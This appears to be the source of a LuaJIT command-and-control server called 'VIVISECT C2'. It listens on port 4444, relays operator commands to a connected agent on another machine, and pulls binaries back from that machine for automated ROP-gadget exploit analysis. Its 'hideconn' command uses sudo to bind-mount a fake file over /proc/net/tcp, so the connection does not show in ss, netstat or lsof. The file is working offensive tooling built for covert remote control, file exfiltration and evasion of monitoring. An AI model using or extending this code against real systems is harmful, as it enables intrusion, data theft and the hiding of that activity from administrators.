#!/usr/bin/env luajit
-- c2/c2_server.lua - WITH HIDECONN

local socket = require("socket")
local bit = require("bit")

local function refresh_connection_hiding()
    while true do
        os.execute("cd /home/bob/vivisect/hooks && luajit hide_connections.lua 4444 && sudo mount --bind /tmp/.fake_tcp /proc/net/tcp 2>/dev/null")
        socket.sleep(5)  -- Refresh every 5 seconds
    end
end

print("╔══════════════════════════════╗")
print("║   VIVISECT C2 v2.0          ║")
print("╚══════════════════════════════╝\n")

local vivisect_path = "/home/bob/vivisect"

local function send_msg(sock, msg)
    local len = #msg
    local header = string.char(
        bit.band(bit.rshift(len, 24), 0xFF),
        bit.band(bit.rshift(len, 16), 0xFF),
        bit.band(bit.rshift(len, 8), 0xFF),
        bit.band(len, 0xFF)
    )
    return sock:send(header .. msg)
end

local function recv_msg(sock)
    local header = sock:receive(4)
    if not header then return nil end
    
    local len = bit.lshift(header:byte(1), 24) +
                bit.lshift(header:byte(2), 16) +
                bit.lshift(header:byte(3), 8) +
                header:byte(4)
    
    if len > 10000000 then return nil end
    
    return sock:receive(len)
end

local server = assert(socket.bind("*", 4444))
print("[*] Listening on :4444\n")

local client = assert(server:accept())
print("[+] Agent connected: " .. client:getpeername())

client:settimeout(60)

assert(send_msg(client, "VIVISECT_C2_HELLO"))
local hello = assert(recv_msg(client), "Handshake failed")
print("[+] " .. hello .. "\n")

while true do
    io.write("C2> ")
    io.flush()
    
    local cmd = io.read("*l")
    
    if not cmd or cmd == "quit" then
        send_msg(client, "exit")
        break
    
    elseif cmd:match("^exploit%s+(.+)") then
        local target = cmd:match("^exploit%s+(.+)")
        print("[*] Downloading: " .. target)
        print("[DEBUG] Sending cat command...")
        
        if not send_msg(client, "cat " .. target) then
            print("[-] Send failed")
        else
            print("[DEBUG] Waiting for response...")
            local binary_data = recv_msg(client)
            
            print("[DEBUG] Received:", binary_data and #binary_data .. " bytes" or "nil")
            
            if not binary_data then
                print("[-] Download failed (timeout or connection lost)")
            elseif binary_data:match("^%(") or binary_data:match("cannot access") then
                print("[-] " .. binary_data)
            else
                print(string.format("[+] Downloaded %d bytes", #binary_data))
                
                local local_path = "/tmp/.vivisect_target"
                local f = io.open(local_path, "wb")
                if f then
                    f:write(binary_data)
                    f:close()
                    
                    print("[*] Running analysis...\n")
                    
                    local analysis_cmd = string.format("cd %s/neural && luajit auto_pwn_standalone.lua %s 2>&1", 
                                                       vivisect_path, local_path)
                    
                    local handle = io.popen(analysis_cmd)
                    if handle then
                        local output = handle:read("*a")
                        handle:close()
                        
                        print("╔═══ EXPLOIT ANALYSIS ═══╗")
                        print(output)
                        print("╚════════════════════════╝\n")
                    end
                end
            end
        end
    
    elseif cmd == "hideconn" then
        print("[*] Hiding C2 connection...")
        
        local result = os.execute("cd /home/bob/vivisect/hooks && sudo luajit hide_connections.lua 4444 && sudo mount --bind /tmp/.fake_tcp /proc/net/tcp")
        
        if result == 0 then
            print("[+] C2 connection now invisible to ss/netstat/lsof")
            print("[!] To restore: sudo umount /proc/net/tcp")
        else
            print("[-] Failed to hide connection")
        end
    
    elseif cmd == "help" then
        print([[
Commands:
  <command>           - Execute on wraith
  exploit <binary>    - Analyze binary for ROP gadgets
  hideconn            - Hide C2 connection from network tools
  quit                - Exit
]])
    
    elseif cmd ~= "" then
        if not send_msg(client, cmd) then
            print("[-] Send failed")
            break
        end
        
        local resp = recv_msg(client)
        if resp then
            print(resp)
        else
            print("[-] No response")
            break
        end
    end
end

client:close()
print("\n[*] Session closed")
